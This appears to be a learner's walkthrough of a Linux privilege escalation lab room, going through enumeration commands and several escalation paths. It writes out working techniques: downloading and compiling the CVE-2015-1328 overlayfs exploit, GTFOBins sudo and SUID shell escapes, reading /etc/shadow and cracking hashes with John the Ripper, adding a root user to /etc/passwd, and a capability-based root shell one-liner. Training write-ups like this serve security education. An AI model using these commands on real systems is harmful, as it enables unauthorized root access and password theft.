# Linux Priviledge Escalation Room

## TASK 3
This task highlighted some commonly used commands for Linux to help guide you into who you are, what connectivity from this device is, and what to look for as possible vulnerability.
- ```uname -a ```
- ``` hostname  ```
- ```cat /proc/version```
- ```cat /etc/issue```
- ```ps -A ``` or ```ps axjf```
- ```sudo -l```
- ```cat /etc/passwd```
- ```ifconfig```
- ```netstat -at```
- ```find /home -name flag1.txt```  or ``` find / -type f -perm 0777 ```
    - ``` find / -perm -u=s -type f 2>/dev/null ``` allows you to find SUID bit files, which allows us to run the file with a higher privilege level than the current user.


## TASK 5
In the room for the Linux Exploitation Task 5, you'll need to use the HackBox to create a new file called `ofs.c` with the contents of the `CVE-2015-1328.c` in it. This is based on the content of the exploit here https://www.exploit-db.com/exploits/37292. Spin up a python3 server by executing: 
    ``` python3 -m http.server 9000```
Then from the target computer, you'll use wget to download the ofs.c file and compile it using the command:
    ```gcc ofs.c -o ofs```
This should result in you opening a shell that results in you being root


## TASK 6
 
For this task the new box needs to be spun up so that there's a box that has the name `LinPrivEscSUDO`. TO start answering questions you'll need to first execute the command to find out which services the current user has the ability to run without password the sudo command. In this case I ran
    ```sudo -l```
From here it lisited the number of services that is the answer to the first question on this task. I was able to go to the site that's referenced in the dialague for this task [GTFOBins](https://gtfobins.github.io/) and search for each of the services listed to see which one would allow us to escalate into a shell that is root privileges. This case I used the command
     ``` sudo find . -exec /bin/sh \;``` 
which started a root session and from there able to cat the flag2.txt file for the answer to the second question. For the third question, using [GTFOBins](https://gtfobins.github.io/) searched for the sudo use of nmap and used the command I found there for the correct answer. Last question took a little bit of searching for how to accomplish the goal, but what I learned was that ```cat /etc/passwd``` allowed me to see that despite frank not having a home directory, frank did have a password hash stored in /etc/shadow. Pretty cool details for how to interpret that file found on this [site](https://takahideiwai.github.io/Cryptography/01-passwordcracking/index.html)


## TASK 7
This task is similar to the one above, but we need to deal with the set user id (SUID) and set group id (SGID) concepts. Using the command:
    ```find / -type f -perm -04000 -ls 2>/dev/null```
we are able to find out which services you can actually run as the owner of those services. The use of [GTFOBins] is still relevant here to list which services have SUID exploits. This section also includes the steps for using the /etc/shadow and /etc/passwd files to list valuable information. Steps are as follows:

- Create outputs of both files by running ```nano passwd.txt ``` and  ```nano shadow.txt``` and copy the contents of the ```base64 "$LFILE" | base64 --decode``` command for each while replacing the LFILE variable with which file you need to read.
- Use the unshadow tool to export to a file with ```unshadow passwd.txt shadow.txt > passwords.txt```
- Execute John the Ripper with a wordlist that will print out password in plain text ```john passwords.txt --wordlists /usr/share/wordlists/rockyou.txt``` if executing from the AttackBox. Then 

The Alternative path was to add the new user hash to the /etc/passwd file with root permissions. This could be done by using the ```openssl passwd -1 -salt ``` command and adding ```:/root:/bin/bash``` permission. This second route only works if you have the ability to sudo into root and adding edit permissions on the /etc/passwd file. 

## TASK 8
This task looks at the capabilities of the binaries on the box. using the command ```getcap -r / 2>/dev/null``` was able to answer the first three questions of this section. The additional binary that was found on the box for me was a service called view. In this case to take advantange of the capabilities I used the command
    ```/home/ubuntu/view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'```
This started a shell that would be started as root and I'd be able to print the contents of the flag file.